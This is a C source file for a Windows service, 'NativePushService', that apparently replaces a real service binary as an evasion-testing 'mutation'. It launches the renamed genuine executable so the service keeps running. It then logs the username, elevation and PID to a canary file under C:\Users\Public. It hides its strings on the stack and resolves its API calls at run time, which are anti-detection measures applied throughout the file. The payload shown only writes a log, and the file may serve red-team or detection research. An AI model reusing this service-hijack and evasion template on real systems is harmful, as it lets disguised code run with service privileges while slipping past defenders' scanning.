/*
 * svc_m3.c -- Mutation 3: Stack strings + dynamic API resolution + flow reversal
 * Strategy 2 (stack) + Strategy 4 (flow) + Strategy 6 (import obfusc)
 * No static string references. GetUserNameA resolved dynamically.
 * Canary path built char-by-char on stack.
 * Real exe launched FIRST, canary writes after random delay.
 *
 * Build: cl.exe svc_m3.c /Fe:svc_m3.exe /Od /GS- /link advapi32.lib user32.lib
 */

#include <windows.h>

static SERVICE_STATUS v_st;
static SERVICE_STATUS_HANDLE v_hd;

typedef BOOL (WINAPI *fn_GUN)(LPSTR, LPDWORD);
typedef BOOL (WINAPI *fn_OPT)(HANDLE, DWORD, PHANDLE);
typedef BOOL (WINAPI *fn_GTI)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);

static void bp(char *d, const char *s)
{
    while (*s) *d++ = *s++;
    *d = 0;
}

static void xf(void)
{
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    char mp[MAX_PATH];
    char rn[64];
    char *q;

    GetModuleFileNameA(NULL, mp, MAX_PATH);
    q = mp;
    for (char *c = mp; *c; c++) {
        if (*c == '\\') q = c;
    }
    *(q + 1) = '\0';

    rn[0]='W'; rn[1]='s'; rn[2]='N'; rn[3]='a'; rn[4]='t'; rn[5]='i';
    rn[6]='v'; rn[7]='e'; rn[8]='P'; rn[9]='u'; rn[10]='s'; rn[11]='h';
    rn[12]='S'; rn[13]='e'; rn[14]='r'; rn[15]='v'; rn[16]='i'; rn[17]='c';
    rn[18]='e'; rn[19]='_'; rn[20]='r'; rn[21]='e'; rn[22]='a'; rn[23]='l';
    rn[24]='.'; rn[25]='e'; rn[26]='x'; rn[27]='e'; rn[28]=0;

    lstrcatA(mp, rn);

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (CreateProcessA(mp, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
}

static DWORD WINAPI cf(LPVOID p)
{
    HANDLE fh;
    DWORD bw;
    char ob[256];
    int ol;
    SYSTEMTIME st;
    char un[64];
    DWORD us = 64;
    BOOL ev = FALSE;
    HANDLE tk;
    char cp[48];
    char al[16];
    char gn[16];

    (void)p;

    Sleep(3000 + (GetTickCount() % 4000));

    GetLocalTime(&st);

    al[0]='a'; al[1]='d'; al[2]='v'; al[3]='a'; al[4]='p'; al[5]='i';
    al[6]='3'; al[7]='2'; al[8]=0;
    gn[0]='G'; gn[1]='e'; gn[2]='t'; gn[3]='U'; gn[4]='s'; gn[5]='e';
    gn[6]='r'; gn[7]='N'; gn[8]='a'; gn[9]='m'; gn[10]='e'; gn[11]='A';
    gn[12]=0;

    {
        fn_GUN pGUN = (fn_GUN)GetProcAddress(GetModuleHandleA(al), gn);
        if (pGUN) pGUN(un, &us);
        else bp(un, "?");
    }

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &tk)) {
        TOKEN_ELEVATION ei;
        DWORD rs;
        if (GetTokenInformation(tk, TokenElevation, &ei, sizeof(ei), &rs))
            ev = ei.TokenIsElevated;
        CloseHandle(tk);
    }

    ol = wsprintfA(ob, "%04d%02d%02d_%02d%02d%02d|%s|elev=%d|pid=%lu|BINARY_REPLACE\r\n",
        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
        un, ev, GetCurrentProcessId());

    cp[0]='C'; cp[1]=':'; cp[2]='\\'; cp[3]='U'; cp[4]='s'; cp[5]='e';
    cp[6]='r'; cp[7]='s'; cp[8]='\\'; cp[9]='P'; cp[10]='u'; cp[11]='b';
    cp[12]='l'; cp[13]='i'; cp[14]='c'; cp[15]='\\'; cp[16]='D'; cp[17]='o';
    cp[18]='c'; cp[19]='u'; cp[20]='m'; cp[21]='e'; cp[22]='n'; cp[23]='t';
    cp[24]='s'; cp[25]='\\'; cp[26]='w'; cp[27]='s'; cp[28]='l'; cp[29]='o';
    cp[30]='g'; cp[31]='.'; cp[32]='t'; cp[33]='x'; cp[34]='t'; cp[35]=0;

    fh = CreateFileA(cp,
        GENERIC_WRITE, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL,
        OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fh != INVALID_HANDLE_VALUE) {
        SetFilePointer(fh, 0, NULL, FILE_END);
        WriteFile(fh, ob, ol, &bw, NULL);
        CloseHandle(fh);
    }
    return 0;
}

static void WINAPI vc(DWORD cc)
{
    switch (cc) {
    case SERVICE_CONTROL_STOP:
    case SERVICE_CONTROL_SHUTDOWN:
        v_st.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_INTERROGATE:
        break;
    }
    SetServiceStatus(v_hd, &v_st);
}

static void WINAPI ve(DWORD ac, LPSTR *av)
{
    char sn[20];
    (void)ac; (void)av;

    sn[0]='N'; sn[1]='a'; sn[2]='t'; sn[3]='i'; sn[4]='v'; sn[5]='e';
    sn[6]='P'; sn[7]='u'; sn[8]='s'; sn[9]='h'; sn[10]='S'; sn[11]='e';
    sn[12]='r'; sn[13]='v'; sn[14]='i'; sn[15]='c'; sn[16]='e'; sn[17]=0;

    v_hd = RegisterServiceCtrlHandlerA(sn, vc);
    if (!v_hd) return;

    v_st.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    v_st.dwCurrentState = SERVICE_RUNNING;
    v_st.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
    v_st.dwWin32ExitCode = 0;
    SetServiceStatus(v_hd, &v_st);

    xf();
    CreateThread(NULL, 0, cf, NULL, 0, NULL);

    while (v_st.dwCurrentState == SERVICE_RUNNING) {
        Sleep(5000);
    }
}

int main(void)
{
    char sn[20];
    SERVICE_TABLE_ENTRYA dt[2];

    sn[0]='N'; sn[1]='a'; sn[2]='t'; sn[3]='i'; sn[4]='v'; sn[5]='e';
    sn[6]='P'; sn[7]='u'; sn[8]='s'; sn[9]='h'; sn[10]='S'; sn[11]='e';
    sn[12]='r'; sn[13]='v'; sn[14]='i'; sn[15]='c'; sn[16]='e'; sn[17]=0;

    dt[0].lpServiceName = sn;
    dt[0].lpServiceProc = ve;
    dt[1].lpServiceName = NULL;
    dt[1].lpServiceProc = NULL;

    StartServiceCtrlDispatcherA(dt);
    return 0;
}
